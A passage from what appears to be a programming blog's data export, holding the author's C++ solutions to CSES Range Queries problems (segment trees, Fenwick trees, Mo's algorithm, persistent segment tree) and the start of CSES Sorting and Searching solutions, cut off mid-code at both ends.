vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)#define lc id * 2 + 1#define rc id * 2 + 2#define M ((L + R) / 2)struct Nodes {    int mx, lz;} seg[200005 * 4];int arr[200005];int n, q;void push(int L, int R, int id) {    if (L != R - 1) {        seg[lc].lz += seg[id].lz;        seg[rc].lz += seg[id].lz;    }    seg[id].mx += seg[id].lz;    seg[id].lz = 0;}void pull(int L, int R, int id) {    if (L == R - 1) return;    push(L, M, lc), push(M, R, rc);    seg[id].mx = max(seg[lc].mx, seg[rc].mx);}void modify(int l, int r, int val, int L = 0, int R = n, int id = 0) {    push(L, R, id);    if (L == l &amp;&amp; R == r) {        seg[id].lz += val;    } else {        if (l &gt;= M)            modify(l, r, val, M, R, rc);        else if (r &lt;= M)            modify(l, r, val, L, M, lc);        else            modify(l, M, val, L, M, lc), modify(M, r, val, M, R, rc);        pull(L, R, id);    }}int query(int l, int r, int L = 0, int R = n, int id = 0) {    push(L, R, id);    if (l == L &amp;&amp; r == R) return seg[id].mx;    if (l &gt;= M) return query(l, r, M, R, rc);    if (r &lt;= M) return query(l, r, L, M, lc);    return max(query(l, M, L, M, lc), query(M, r, M, R, rc));}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; q;    rep(i, 0, n - 1) cin &gt;&gt; arr[i], modify(i, n, arr[i]);    while (q--) {        int cmd, a, b;        cin &gt;&gt; cmd &gt;&gt; a &gt;&gt; b;        a--;        if (cmd == 1)            modify(a, n, b - arr[a]), arr[a] = b;        else if (a == 0)            cout &lt;&lt; max((int)0, arr[0]);        else            cout &lt;&lt; max((int)0, query(a, b) - query(a - 1, a)) &lt;&lt; '\\n';    }    return 0;}\nPizzeria Queries \nPizzeria Queries#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, q;#define lc id * 2 + 1#define rc id * 2 + 2#define M ((L + R) / 2)int seg[200005 * 4][3];  // left-&gt;0, right-&gt;1void pull(int side, int L, int R, int id) {    seg[id][side] = min(seg[lc][side], seg[rc][side]);}void modify(int pos, int val, bool side, int L = 0, int R = n, int id = 0) {    if (L == R - 1) {        seg[id][side] = val + (side ? L : -L);    } else {        if (pos &gt;= M)            modify(pos, val, side, M, R, rc);        else            modify(pos, val, side, L, M, lc);        pull(side, L, R, id);    }}int query(int l, int r, bool side, int L = 0, int R = n, int id = 0) {    if(l==r) return 0;    if (l == L &amp;&amp; r == R) return seg[id][side];    if (l &gt;= M) return query(l, r, side, M, R, rc);    if (r &lt;= M) return query(l, r, side, L, M, lc);    return min(query(l, M, side, L, M, lc), query(M, r, side, M, R, rc));}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; q;    rep(i, 0, 200000 * 4) seg[i][0] = seg[i][1] = 1e9;    int tmp;    rep(i, 0, n - 1) cin &gt;&gt; tmp, modify(i, tmp, 0), modify(i, tmp, 1);    while (q--) {        int cmd, a, b;        cin &gt;&gt; cmd &gt;&gt; a;        a--;        if (cmd == 1)            cin &gt;&gt; b, modify(a, b, 0), modify(a, b, 1);        else            cout &lt;&lt; min(a + query(0, a+1, 0), query(a, n, 1) - a) &lt;&lt; '\\n';    }    return 0;}\nSubarray Sum Queries \nSubarray Sum Queries#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)#define lc id * 2 + 1#define rc id * 2 + 2#define M ((L + R) / 2)int n, q;struct Nodes {    int pre, suf, sum, mx;} seg[200005 * 4];void pull(int L, int R, int id) {    if (L == R - 1) return;    seg[id].pre = max(seg[lc].pre, seg[lc].sum + seg[rc].pre);    seg[id].suf = max(seg[rc].suf, seg[lc].suf + seg[rc].sum);    seg[id].sum = seg[lc].sum + seg[rc].sum;    seg[id].mx = max(max(seg[lc].mx, seg[rc].mx), seg[lc].suf + seg[rc].pre);}void modify(int pos, int val, int L = 0, int R = n, int id = 0) {    if (L == R - 1) {        seg[id].pre = seg[id].suf = seg[id].sum = seg[id].mx = val;    } else {        if (pos &gt;= M)            modify(pos, val, M, R, rc);        else            modify(pos, val, L, M, lc);        pull(L, R, id);    }}signed main() {    ios;    int tmp;    cin &gt;&gt; n &gt;&gt; q;    rep(i, 0, n - 1) cin &gt;&gt; tmp, modify(i, tmp);    while (q--) {        int a, b;        cin &gt;&gt; a &gt;&gt; b;        modify(a - 1, b);        cout &lt;&lt; max((int)0, seg[0].mx) &lt;&lt; '\\n';    }    return 0;}\nDistinct Values Queries \nDistinct Values Queries#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, q, s;struct Q {    int l, r, id, ans;    bool operator&lt;(const Q &amp;b) const {        if (l / s != b.l / s) return l &lt; b.l;        return ((l / s) &amp; 1) ? (r &lt; b.r) : (r &gt; b.r);    }};signed main() {    ios;    cin &gt;&gt; n &gt;&gt; q;    vi arr(n + 1);    vi ord;    rep(i, 1, n) cin &gt;&gt; arr[i], ord.eb(arr[i]);    sort(all(ord));    rep(i, 1, n) arr[i] = (lower_bound(all(ord), arr[i])-ord.begin());    s = sqrt(n);        vii in(q);    vector&lt;Q&gt; queries(q);        for(pii &amp;i : in) cin &gt;&gt;i.F &gt;&gt; i.S;        rep(i, 0, q - 1) queries[i] = {in[i].F, in[i].S, i, 0};    sort(all(queries));    int cur_l = 1, cur_r = 1;    vi cnt(n+1, 0);    cnt[arr[1]] = 1;    int distinct = 1;    for (auto &amp;query : queries) {        while (cur_l &gt; query.l) {            cur_l--;            if (++cnt[arr[cur_l]] == 1) distinct++;        }        while (cur_r &lt; query.r) {            cur_r++;            if (++cnt[arr[cur_r]] == 1) distinct++;        }        while (cur_l &lt; query.l) {            if (--cnt[arr[cur_l]] == 0) distinct--;            cur_l++;        }        while (cur_r &gt; query.r) {            if (--cnt[arr[cur_r]] == 0) distinct--;            cur_r--;        }        query.ans = distinct;    }    vi ans(q);    for (auto &amp;query : queries) ans[query.id] = query.ans;    for (auto &amp;x : ans) cout &lt;&lt; x &lt;&lt; '\\n';    return 0;}\nIncreasing Array Queries \nIncreasing Array Queries#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, q;vi pre;vi arr;#define lc id * 2#define rc id * 2 + 1#define M ((L + R) / 2)struct nodes {    int sum, lz;} seg[200005 * 4];void push(int L, int R, int id) {    if (seg[id].lz == 0) return;    if (L != R - 1) seg[lc].lz = seg[rc].lz = seg[id].lz;    seg[id].sum = seg[id].lz * (R - L);    seg[id].lz = 0;}void pull(int L, int R, int id) {    if (L == R - 1) return;    push(L, M, lc), push(M, R, rc);    seg[id].sum = seg[lc].sum + seg[rc].sum;}void modify(int l, int r, int val, int L = 1, int R = n + 1, int id = 1) {    push(L, R, id);    if (l == L &amp;&amp; r == R) {        seg[id].lz = val;    } else {        if (l &gt;= M)            modify(l, r, val, M, R, rc);        else if (r &lt;= M)            modify(l, r, val, L, M, lc);        else            modify(l, M, val, L, M, lc), modify(M, r, val, M, R, rc);        pull(L, R, id);    }}int query(int l, int r, int L = 1, int R = n + 1, int id = 1) {    push(L, R, id);    if (l == L &amp;&amp; r == R)        return seg[id].sum;    else if (l &gt;= M)        return query(l, r, M, R, rc);    else if (r &lt;= M)        return query(l, r, L, M, lc);    return query(l, M, L, M, lc) + query(M, r, M, R, rc);}int sum(int l, int r) { return pre[r - 1] - pre[l - 1]; }signed main() {    ios;    cin &gt;&gt; n &gt;&gt; q;    pre.resize(n + 1), arr.resize(n + 1);    pre[0] = 0;    rep(i, 1, n) cin &gt;&gt; arr[i], modify(i, i + 1, arr[i]),        pre[i] = pre[i - 1] + arr[i];    vector&lt;pair&lt;pii, int&gt;&gt; qs(q);    rep(i, 0, q - 1) cin &gt;&gt; qs[i].F.F &gt;&gt; qs[i].F.S, qs[i].S = i;    sort(all(qs), [](auto a, auto b) { return a.F.F &gt; b.F.F; });    vi ans(q);    vii mx;    int cur = n;    mx.eb(1e10, n+1);    for (auto i : qs) {        int l = i.F.F;int r = i.F.S;int id = i.S;        while (cur &gt;= l) {            if (arr[cur] &gt; mx.back().F) {                while (!mx.empty() &amp;&amp; arr[cur] &gt; mx.back().F)                    mx.pob();                modify(cur, mx.back().S, arr[cur]);            }            mx.eb(arr[cur], cur);            cur--;        }        modify(l, mx.back().S+1, mx.back().F);        ans[id] = query(l, r+1) - sum(l, r + 1);    }    for (int i : ans) cout &lt;&lt; i &lt;&lt; '\\n';    return 0;}\nForest Queries II \nForest Queries II#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */// #define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, q;bool arr[1003][1003];struct BIT {    int bit[1003];    void modify(int pos, int val) {        for (; pos &lt;= n; pos += pos &amp; (-pos)) bit[pos] += val;    }    int query(int pos) {        int ans = 0;        for (; pos &gt; 0; pos -= pos &amp; (-pos)) ans += bit[pos];        return ans;    }};struct BIT2 {    BIT bit[1003];    void modify(int pos_y, int pos_x, int val) {        for (; pos_y &lt;= n; pos_y += pos_y &amp; (-pos_y))            bit[pos_y].modify(pos_x, val);    }    int query(int pos_y, int pos_x) {        int ans = 0;        for (; pos_y &gt; 0; pos_y -= pos_y &amp; (-pos_y))            ans += bit[pos_y].query(pos_x);        return ans;    }};signed main() {    ios;    cin &gt;&gt; n &gt;&gt; q;    BIT2 bit;    char tmp;    rep(i, 1, n) rep(j, 1, n) cin &gt;&gt; tmp,        arr[i][j] = (tmp == '*'),        bit.modify(i, j, arr[i][j]);    while (q--) {        int cmd, y1, x1, y2, x2;        cin &gt;&gt; cmd &gt;&gt; y1 &gt;&gt; x1;        if (cmd == 1)            bit.modify(y1, x1, arr[y1][x1] == 1 ? -1 : 1), arr[y1][x1] = (arr[y1][x1])^(1);        else {            cin &gt;&gt; y2 &gt;&gt; x2;            if (x1 &lt; x2) swap(x1, x2);            if (y1 &lt; y2) swap(y1, y2);            cout &lt;&lt; bit.query(y1, x1) - bit.query(y1, x2 - 1) -                        bit.query(y2 - 1, x1) + bit.query(y2 - 1, x2 - 1)                 &lt;&lt; '\\n';        }    }    return 0;}\nRange Updates and Sums \nRange Updates and Sums#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si _set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)#define lc id * 2 + 1#define rc id * 2 + 2#define M ((L + R) / 2)struct Nodes {    int info, add, _set;} seg[4 * 200005];void push(int L, int R, int id) {    if (seg[id]._set) {        if (R != L + 1) seg[lc]._set = seg[rc]._set = seg[id]._set;        if (R != L + 1) seg[lc].add = seg[rc].add = 0;        seg[id].info = seg[id]._set * (R - L);        seg[id]._set = 0;    }    if (seg[id].add) {        if (R != L + 1) seg[lc].add += seg[id].add;        if (R != L + 1) seg[rc].add += seg[id].add;        seg[id].info += seg[id].add * (R - L);        seg[id].add = 0;    }}void pull(int L, int R, int id) {    push(L, M, lc), push(M, R, rc);    seg[id].info = seg[lc].info + seg[rc].info;}void add(int l, int r, int val, int L, int R, int id) {    push(L, R, id);    if (l == L &amp;&amp; R == r) {        seg[id].add += val;    } else {        if (l &gt;= M)            add(l, r, val, M, R, rc);        else if (r &lt;= M)            add(l, r, val, L, M, lc);        else            add(l, M, val, L, M, lc), add(M, r, val, M, R, rc);        pull(L, R, id);    }}void _set(int l, int r, int val, int L, int R, int id) {    push(L, R, id);    if (l == L &amp;&amp; R == r) {        seg[id]._set = val;    } else {        if (l &gt;= M)            _set(l, r, val, M, R, rc);        else if (r &lt;= M)            _set(l, r, val, L, M, lc);        else            _set(l, M, val, L, M, lc), _set(M, r, val, M, R, rc);        pull(L, R, id);    }}int query(int l, int r, int L, int R, int id) {    push(L, R, id);    if (l == L &amp;&amp; r == R) return seg[id].info;    if (l &gt;= M) return query(l, r, M, R, rc);    if (r &lt;= M) return query(l, r, L, M, lc);    return query(l, M, L, M, lc) + query(M, r, M, R, rc);}signed main() {    ios;    int n, q, tmp;    cin &gt;&gt; n &gt;&gt; q;    rep(i, 0, n - 1) cin &gt;&gt; tmp, _set(i, i + 1, tmp, 0, n, 0);    while (q--) {        int cmd, a, b, x;        cin &gt;&gt; cmd &gt;&gt; a &gt;&gt; b;        a--;        if (cmd == 1) cin &gt;&gt; x, add(a, b, x, 0, n, 0);        if (cmd == 2) cin &gt;&gt; x, _set(a, b, x, 0, n, 0);        if (cmd == 3) cout &lt;&lt; query(a, b, 0, n, 0) &lt;&lt; '\\n';    }    return 0;}\nPolynomial Queries \nPolynomial Queries#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)#define lc id * 2 + 1#define rc id * 2 + 2#define M ((L + R) / 2)int n, q;vi arr;struct nodes {    int sum, lz_s, lz_d;} seg[200005 * 4];void push(int L, int R, int id) {    if (seg[id].lz_s == 0 &amp;&amp; seg[id].lz_d == 0) return;    if (L != R - 1) {        seg[lc].lz_s += seg[id].lz_s;        seg[lc].lz_d += seg[id].lz_d;        seg[rc].lz_s += seg[id].lz_s + (M - L) * seg[id].lz_d;        seg[rc].lz_d += seg[id].lz_d;    }    seg[id].sum += (R - L) * (seg[id].lz_s*2 + seg[id].lz_d * (R - L - 1)) / 2;    seg[id].lz_s = seg[id].lz_d = 0;}void pull(int L, int R, int id) {    if (L == R - 1) return;    push(L, M, lc), push(M, R, rc);    seg[id].sum = seg[lc].sum + seg[rc].sum;}void build(int L = 0, int R = n, int id = 0) {    if (L == R - 1) {        seg[id].sum = arr[L];    } else {        build(L, M, lc), build(M, R, rc);        pull(L, R, id);    }}void modify(int l, int r, int val = 1, int L = 0, int R = n, int id = 0) {    push(L, R, id);    if (l == L &amp;&amp; r == R) {        seg[id].lz_s += val;        seg[id].lz_d++;    } else {        if (l &gt;= M)            modify(l, r, val, M, R, rc);        else if (r &lt;= M)            modify(l, r, val, L, M, lc);        else            modify(l, M, val, L, M, lc), modify(M, r, val + M - l, M, R, rc);        pull(L, R, id);    }}int query(int l, int r, int L = 0, int R = n, int id = 0) {    push(L, R, id);    if (l == L &amp;&amp; r == R) return seg[id].sum;    if (l &gt;= M) return query(l, r, M, R, rc);    if (r &lt;= M) return query(l, r, L, M, lc);    return query(l, M, L, M, lc) + query(M, r, M, R, rc);}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; q;    arr.resize(n);    for (int &amp;i : arr) cin &gt;&gt; i;    build();    while (q--) {        int cmd, a, b;        cin &gt;&gt; cmd &gt;&gt; a &gt;&gt; b;        a--;        if (cmd == 1)            modify(a, b);        else            cout &lt;&lt; query(a, b) &lt;&lt; '\\n';    }    return 0;}\nRange Queries and Copies \nRange Queries and Copies#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)#define _lc seg[id].lc#define _rc seg[id].rc#define M ((L + R) / 2)int n, q, cur = 0;vi arr;vi ls;struct node {    int lc, rc, sum = 0;} seg[200005 * 2 + 200005 * 19];// build -&gt; 200005*2, modify -&gt; 200005*(log_2(200005)+1)void build(int L = 0, int R = n, int id = 0) {    if (L == R - 1) {        seg[id].sum = arr[L];    } else {        seg[id].lc = ++cur, seg[id].rc = ++cur;        build(L, M, _lc), build(M, R, _rc);        seg[id].sum = seg[_lc].sum + seg[_rc].sum;    }}void modify(int &amp;id, int pos, int val, int L = 0, int R = n) {    seg[++cur] = seg[id];    id = cur;    if (L == R - 1) {        seg[id].sum = val;    } else {        if (pos &gt;= M)            modify(_rc, pos, val, M, R);        else            modify(_lc, pos, val, L, M);        seg[id].sum = seg[_lc].sum + seg[_rc].sum;    }}int query(int id, int l, int r, int L = 0, int R = n) {    if (l == L &amp;&amp; r == R) return seg[id].sum;    if (l &gt;= M) return query(_rc, l, r, M, R);    if (r &lt;= M) return query(_lc, l, r, L, M);    return query(_lc, l, M, L, M) + query(_rc, M, r, M, R);}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; q;    arr.resize(n);    ls.eb(0);    rep(i, 0, n - 1) cin &gt;&gt; arr[i];    build();    while (q--) {        int cmd, a, b, k, x;        cin &gt;&gt; cmd;        if (cmd == 1) {            cin &gt;&gt; k &gt;&gt; a &gt;&gt; x;            k--, a--;            modify(ls[k], a, x);        } else if (cmd == 2) {            cin &gt;&gt; k &gt;&gt; a &gt;&gt; b;            k--, a--;            cout &lt;&lt; query(ls[k], a, b) &lt;&lt; '\\n';        } else {            cin &gt;&gt; k;            ls.eb(ls[--k]);        }    }    return 0;}\n","categories":["程式題解","CSES"],"tags":["CSES"]},{"title":"CSES Sorting and Searching","url":"/CSES_Sorting_and_Searching/","content":"CSES Sorting and Searching \nCSES Sorting and Searching 的 AC 程式碼\n\nCSES Problem Set\n我的 Profile\n我的程式們\nDistinct Numbers \nDistinct Numbers#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for (int i = a; i &lt;= b; i++)#define rev(i, a, b) for (int i = a; i &gt;= b; i--)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0);using namespace std;signed main() {    ios;    int n;    set&lt;int&gt; x;    cin &gt;&gt; n;    int tmp;    rep(i, 1, n) cin &gt;&gt; tmp, x.insert(tmp);    cout &lt;&lt; x.size() &lt;&lt; '\\n';    return 0;}\nApartments \nApartments#include &lt;bits/stdc++.h&gt;// #define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for (int i = a; i &lt;= b; i++)#define rev(i, a, b) for (int i = a; i &gt;= b; i--)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define pb push_back#define eb emplace_back#define all(a) a.begin(), a.end()#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0);using namespace std;signed main() {    ios;    int n, m, k, ans = 0, a[200005], b[200005];    cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;    rep(i, 1, n) cin &gt;&gt; a[i];    rep(i, 1, m) cin &gt;&gt; b[i];    sort(a + 1, a + n + 1);    sort(b + 1, b + m + 1);    for (int i = 1, j = 1; i &lt;= n &amp;&amp; j &lt;= m;) {        if (a[i] + k &gt;= b[j] &amp;&amp; a[i] - k &lt;= b[j])            i++, j++, ans++;        else if (a[i] + k &lt; b[j])            i++;        else if (a[i] - k &gt; b[j])            j++;    }    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nFerris Wheel \nFerris Wheel#include &lt;bits/stdc++.h&gt;// #define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for (int i = a; i &lt;= b; i++)#define rev(i, a, b) for (int i = a; i &gt;= b; i--)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define pb push_back#define eb emplace_back#define all(a) a.begin(), a.end()#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0);using namespace std;signed main() {    ios;    int n, x, ans = 0;    cin &gt;&gt; n &gt;&gt; x;    vector&lt;int&gt; p(n);    for (int&amp; i : p) cin &gt;&gt; i;    sort(all(p));    for (int l = 0, r = n - 1; r &gt;= l;) {        if (p[l] + p[r] &lt;= x)            ans++, l++, r--;        else if (p[l] + p[r] &gt;= x)            ans++, r--;    }    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nConcert Tickets \nConcert Tickets#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define pob pop_back#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)using namespace std;signed main() {    // ios;    int n, m, tmp;    map&lt;int, int&gt; ticket;    cin &gt;&gt; n &gt;&gt; m;    rep(i, 1, n) cin &gt;&gt; tmp, ticket[tmp]++;    rep(i, 1, m){        cin &gt;&gt; tmp;        auto it_bigger_price = ticket.upper_bound(tmp);        if(it_bigger_price == ticket.begin()) cout &lt;&lt; -1 &lt;&lt; '\\n';        else{            auto it_price = prev(it_bigger_price);            ticket[(*it_price).F]--, cout &lt;&lt; (*it_price).F &lt;&lt; '\\n';            if(ticket[(*it_price).F]==0) ticket.erase(it_price);        }    }    return 0;}\nRestaurant Customers \nRestaurant Customers#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vi vector&lt;int&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n;    set&lt;pii&gt; arr;    cin &gt;&gt; n;    rep(i, 1, n) {        int a, b;        cin &gt;&gt; a &gt;&gt; b;        arr.insert({a, 1}), arr.insert({b, -1});    }    int ans = 0, cur = 0;    for (pii i : arr) {        cur += i.S;        tomax(ans, cur);    }    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nMovie Festival \nMovie Festival#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vi vector&lt;int&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n;    cin &gt;&gt; n;    vector&lt;pii&gt; m(n);    for (pii &amp;i : m) cin &gt;&gt; i.F &gt;&gt; i.S;    sort(all(m), [](pii a, pii b) { return a.S &lt; b.S; });    int now_e = 0, ans = 0;        for (pii i : m) {        if (i.F &gt;= now_e) ans++, now_e = i.S;    }    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nSum of Two Values \nSum of Two Values#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vi vector&lt;int&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, x, divide = -1;    map&lt;int, int&gt; 